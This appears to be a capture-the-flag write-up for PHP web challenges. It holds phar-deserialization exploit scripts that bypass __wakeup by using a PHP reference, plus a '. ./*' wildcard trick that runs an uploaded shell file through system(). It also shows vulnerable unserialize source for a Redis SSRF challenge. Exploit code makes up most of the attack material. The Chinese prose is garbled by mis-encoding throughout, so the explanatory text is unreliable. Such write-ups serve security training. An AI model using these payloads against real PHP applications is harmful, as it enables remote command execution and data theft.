<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9?$@]+/&#x27;</span>, <span class="variable">$this</span>-&gt;value))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;value = <span class="string">&#x27;nono~&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ˜¯æ— æ•°å­—å­—æ¯ï¼Œä½†è‚¯å®šä¸èƒ½ç”¨evalçš„æ— å­—æ¯æ•°å­—rceï¼Œå› ä¸ºsystemæ˜¯ä¸ä¼šè¯†åˆ«çš„ï¼ˆæµ‹è¯•ï¼‰,è‡ªç„¶æƒ³åˆ°é€šé…ç¬¦<code>.?*</code>ï¼Œï¼Ÿè¢«banäº†æ‰€ä»¥åªå¯ä»¥è€ƒè™‘<code>.*</code>è®°å¾—å‘½ä»¤æ‰§è¡Œé‡Œæœ‰ä¸ªtipsæ˜¯æ–‡ä»¶ä¸Šä¼ pocå—ï¼Œé‚£é‡Œé¢çš„payloadæ˜¯<code>???/?????</code>è¿™ç§ç±»å‹çš„ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å‘¢ï¼Ÿ<br>æ³¨æ„backdooré‡Œçš„<code>chdir(&#39;./upload&#39;);</code>ææ„å‡½æ•°æ‰§è¡Œåå›åˆ‡æ¢åˆ°uploadç›®å½•ä¸‹<br>å†è¡¥å……ä¸€ä¸ªairçš„å°tips,ä¸ç®¡ä½ çš„åç¼€åæ˜¯ä»€ä¹ˆï¼Œçœ‹å¦‚ä¸‹ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669901357396-6c391b58-e0d0-4d49-847c-6325afe69ec2.png#averageHue=%230d0b08&clientId=u43d448bb-efee-4&from=paste&height=54&id=uaac99b37&name=image.png&originHeight=68&originWidth=1152&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8583&status=done&style=none&taskId=ub6375637-6e0d-4e47-8ff3-24d7fd1dcbe&title=&width=921.6" alt="image.png"><br>æˆåŠŸçš„æ‰§è¡Œäº†å‘½ä»¤ï¼Œåˆ°è¿™é‡Œæ€è·¯å°±æœ‰ä¸€åŠäº†ï¼Œé‚£è‚¯å®šæ˜¯åˆ©ç”¨<code>. ./*</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669901622582-f9fc2b22-be68-4a4e-8c68-ae3b58a57cf4.png#averageHue=%231e1c1b&clientId=u43d448bb-efee-4&from=paste&height=74&id=ue050c776&name=image.png&originHeight=92&originWidth=439&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6208&status=done&style=none&taskId=u8426a0bf-6f43-40d4-916f-e527162d3e1&title=&width=351.2" alt="image.png"><br>åœ¨æœ¬åœ°å¯ä»¥å¤ç°æˆåŠŸï¼Œä½†æœ‰ä¸€ä¸ªå‰æï¼Œå°±æ˜¯1.pngæ–‡ä»¶å¿…é¡»åœ¨ç¬¬ä¸€ä¸ªå¦åˆ™é€šé…ç¬¦æ˜¯æ— æ³•è¯†åˆ«çš„<br>é—®é¢˜åˆæ¥äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="string">&quot;Don&#x27;t make dream.Wake up plz!&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ª<code>__wakeup</code>æˆ‘ä»¬ç©¶ç«Ÿå¦‚ä½•ç»•è¿‡ï¼Œæˆ‘ä»¬ä¸è¦å¿½ç•¥äº†userç±»ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$cklen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$cklen</span> != <span class="number">0</span> <span class="keyword">and</span> <span class="variable">$cklen</span> &lt;= <span class="number">6</span>) &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è®©usernameçš„å€¼ä¸º<code>. ./*</code>ç„¶åè®©backdoorä¸­çš„<code>value</code>æŒ‡é’ˆæŒ‡å‘Userä¸­çš„<code>username</code>ï¼Œæ˜¯å¦å°±å¯ä»¥ç»•è¿‡äº†å‘¢ï¼Ÿä¸ºäº†éªŒè¯ä¸€ä¸‹æˆ‘åœ¨æœ¬åœ°è¿›è¡Œäº†å¦‚ä¸‹å¤ç°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;boogipop&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">smart</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$shell</span>=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$shell</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">smart</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">foo</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;shell=&amp;<span class="variable">$b</span>-&gt;name;</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(smart)#3 (1) &#123; [&quot;shell&quot;]=&gt; string(8) &quot;boogipop&quot; &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç»“æœä¸æ˜¯ç©ºï¼Œè¯´æ˜å¯ä»¥ç»•è¿‡ï¼Œé‚£OKï¼Œæ€è·¯å·²ç»è¢«è¯æ˜äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯å»è§£é¢˜äº†ï¼Œè¿˜æœ‰ä¸ªå°é—®é¢˜å°±æ˜¯å¦‚ä½•å–è§¦å‘ååºåˆ—åŒ–å‘¢ï¼Œæˆ‘ä»¬ä»ä»»æ„æ–‡ä»¶ä¸‹è½½å¤šå°‘å¯ä»¥çŒœå‡ºæ¥ï¼Œè¯»å–çš„è¯­å¥æ˜¯<code>file_get_contents()</code>,é‚£ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦è¿›è¡Œä¸€ä¸ªpharååºåˆ—åŒ–å³å¯ï¼ŒLets make POP</p>
<h3 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;aaa=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;abcd.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>upload/dasctf840b364c5ed3ba9e9f5062fa07aa9216.jpg</code><br>è¿™é‡Œçš„:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;aaa=$a;</span><br></pre></td></tr></table></figure>
<p>æ˜¯ä¸ºäº†è®©valueæˆåŠŸæŒ‡å‘username<br>è¿™æ˜¯æ­£å¸¸çš„åºåˆ—åŒ–åçš„Userç±»<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669979074339-6e7b6b11-2be8-457c-b972-d8a569d02d7a.png#averageHue=%23eff7d2&clientId=ue54c6e61-b42b-4&from=paste&height=106&id=uc06e99a6&name=image.png&originHeight=133&originWidth=725&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13355&status=done&style=none&taskId=ub4bd842c-9c4a-495d-9c1f-5789f5cfb2c&title=&width=580" alt="image.png"><br>å‡å¦‚ä¸åŠ é‚£ä¸€å¥è¯å°±å˜æˆäº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669979107105-2982eb96-1674-4843-8752-7caff298c1fd.png#averageHue=%23c4d6ad&clientId=ue54c6e61-b42b-4&from=paste&height=73&id=ue0081f72&name=image.png&originHeight=91&originWidth=557&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6733&status=done&style=none&taskId=u19ec109d-c8e5-4825-bc58-40bb84b30be&title=&width=445.6" alt="image.png"><br>å¯ä»¥çœ‹åˆ°ç±»å‹å˜æˆäº†Nï¼Œæ²¡æœ‰æŒ‡å‘æˆåŠŸ<br>å…ˆä¸Šä¼ æˆ‘ä»¬çš„shell.jpgæ–‡ä»¶ï¼Œç„¶åå†ä¸Šä¼ pharæ–‡ä»¶ï¼Œæœ€åpharæ–‡ä»¶åŒ…å«ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669907747854-7d73c37d-c5bc-4c84-9f03-580999434b40.png#averageHue=%23faf9f8&clientId=u43d448bb-efee-4&from=paste&height=87&id=u9cf1d118&name=image.png&originHeight=109&originWidth=1460&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8824&status=done&style=none&taskId=u5357540c-21e8-48b3-8afe-7aa22bcd6ac&title=&width=1168" alt="image.png"><br>å†åˆ©ç”¨ä»»æ„æ–‡ä»¶ä¸‹è½½å¾—åˆ°å³å¯å¾—åˆ°flag</p>
<h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p>åŒæ ·çš„ï¼Œé¢„æœŸè§£æ˜¯åˆ©ç”¨<code>* /*</code>å»è¯»å–æ–‡ä»¶ï¼Œä¸Šä¼ ä¸€ä¸ªåä¸ºcatçš„æ–‡ä»¶ï¼Œç„¶åè¯»å‡ºflag<br>è¿™é‡Œå°±æ”¾ä¸€ä¸‹@succ3å¸ˆå‚…çš„é¢˜è§£äº†ï¼Œå› ä¸ºå¤§éƒ¨åˆ†ä¸€æ ·<br>ç¬¬ä¸€æ¡pop</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$User</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$Test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$User</span>-&gt;username = <span class="variable">$Test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$User</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;ddd.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$User</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶å°±å†™å…¥äº†catï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669980172068-916ae1b9-3cea-4cec-bc1b-fe4d0a542b78.png#averageHue=%23202020&clientId=ue54c6e61-b42b-4&from=paste&id=u9915d041&name=image.png&originHeight=116&originWidth=2328&originalType=url&ratio=1&rotation=0&showTitle=false&size=28383&status=done&style=none&taskId=u38fadc69-a10e-49c0-9605-9faa55e3122&title=" alt="image.png"><br>ç¬¬äºŒæ­¥å°±å’Œéé¢„æœŸä¸€æ¨¡ä¸€æ ·äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$User</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$Test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$User</span>-&gt;a = <span class="variable">$Test</span>;</span><br><span class="line"><span class="variable">$Test</span>-&gt;value = &amp;<span class="variable">$User</span>-&gt;username;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$User</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;ddd.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$User</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç„¶ååŒæ ·çš„pharæ–‡ä»¶åŒ…å«å³å¯äº†</p>
<h3 id="åˆ†æä¸€ä¸ªå°å‘"><a href="#åˆ†æä¸€ä¸ªå°å‘" class="headerlink" title="åˆ†æä¸€ä¸ªå°å‘"></a>åˆ†æä¸€ä¸ªå°å‘</h3><p>ç»è¿‡ä¸€ç³»åˆ—æµ‹è¯•ï¼Œå‘ç°éé¢„æœŸè§£è§£æ³•ä¸­æœ‰2ä¸ªç–‘ç‚¹ï¼Œç¬¬ä¸€ç‚¹å°±æ˜¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;aaa=<span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
<p>ååºåˆ—åŒ–ä¸­è¿™ä¸¤å¥æ„åœ¨ä½•ä¸ºï¼Œå¦ä¸€ä¸ªå°±æ˜¯ä¹‹åpharååºåˆ—åŒ–ä¸ºä»€ä¹ˆæœ€ååªå¯ä»¥æ˜¯jpgæ ¼å¼ï¼Œpngæ ¼å¼å°±æ— æ³•å¤ç°<br>ç¬¬ä¸€ä¸ªå‘ç‚¹åœ¨ä¸Šé¢å·²ç»åˆ†æè¿‡äº†ï¼Œä¸ºäº†è®©valueæˆåŠŸçš„æŒ‡å‘username<br>ç¬¬äºŒä¸ªéœ€è¦åœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼Œæˆ‘å‡†å¤‡äº†ä»¥ä¸‹æµ‹è¯•é¡µé¢ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$value</span>=<span class="string">&quot;empty&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;value==<span class="string">&#x27;key&#x27;</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ä¹Ÿç”Ÿæˆä¸€ä¸ªpharï¼ŒæŠŠåç¼€åæ”¹ä¸ºpngï¼Œå‘ç°ä¹Ÿå¯ä»¥æˆåŠŸè§¦å‘å•Šï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669979582349-8b1b70a5-eeca-4f7e-8d72-bf0f7ae3d95c.png#averageHue=%23cba773&clientId=ue54c6e61-b42b-4&from=paste&height=558&id=u2245067d&name=image.png&originHeight=697&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102972&status=done&style=none&taskId=uf6993043-355e-4991-b37b-5076014667f&title=&width=1536" alt="image.png"><br>é‚£ä¸ºä»€ä¹ˆé¢˜ç›®ä¸­æ”¹ä¸ºpngå°±æ— æ³•è§¦å‘å‘¢?çŒœæµ‹åªå¯èƒ½æ˜¯ä¸€ç§åŸå› äº†ï¼Œé‚£å°±æ˜¯å‡å¦‚æ”¹ä¸ºpngï¼Œæˆ‘ä»¬ä¸Šä¼ çš„shellå›¾ç‰‡å°±ä¸æ˜¯æ’åœ¨ç¬¬ä¸€ä½ï¼Œä¹Ÿå°±æ˜¯æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œåªæœ‰è¿™ä¸€ç§å¯èƒ½äº†</p>
<h2 id="EasyLove"><a href="#EasyLove" class="headerlink" title="EasyLove"></a>EasyLove</h2><p>è€ƒç‚¹ï¼šåŸç”Ÿç±»SSRFæ‰“æœ‰å¯†ç çš„REDIS<br>redisæ•°æ®åº“è¿˜æ²¡å­¦å‘œå‘œå‘œå‘œï¼Œä¸€å®šå­¦å®Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$wllm</span>,<span class="variable">$arsenetang</span>,<span class="variable">$l61q4cheng</span>,<span class="variable">$love</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wllm = <span class="variable">$wllm</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arsenetang = <span class="variable">$arsenetang</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l61q4cheng = <span class="variable">$l61q4cheng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="variable">$love</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt; hint.<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hello</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$world</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hello</span>);  </span><br></pre></td></tr></table></figure>
